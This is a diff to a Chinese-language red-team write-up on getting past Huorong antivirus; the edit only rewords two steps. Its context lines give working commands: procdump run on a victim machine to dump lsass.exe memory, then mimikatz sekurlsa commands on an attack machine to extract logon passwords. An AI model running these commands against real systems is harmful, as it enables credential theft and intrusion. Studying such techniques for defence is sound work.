@@ -8,13 +8,13 @@
 
 ### 0x01 过火绒过程记录
 受害虚拟机：Windows 2008 R2安装火绒  
-上传procdump64.exe后执行命令
+上传procdump64.exe到受害机后执行命令
 ```
 .\procdump64.exe -accepteula -ma lsass.exe lsass.dmp
 ```
 提取进程lsass.exe的内存到文件lsass.dmp中，如下图  
 ![image](./pic/0.png)  
-将lsass.dmp拷贝到宿主机中64位的mimikatz目录下，执行命令
+下载提取到的lsass.dmp到攻击机的64位mimikatz目录下，执行命令
 ```
 .\mimikatz.exe "sekurlsa::minidump lsass.dmp" "sekurlsa::logonPasswords full" exit
 ```
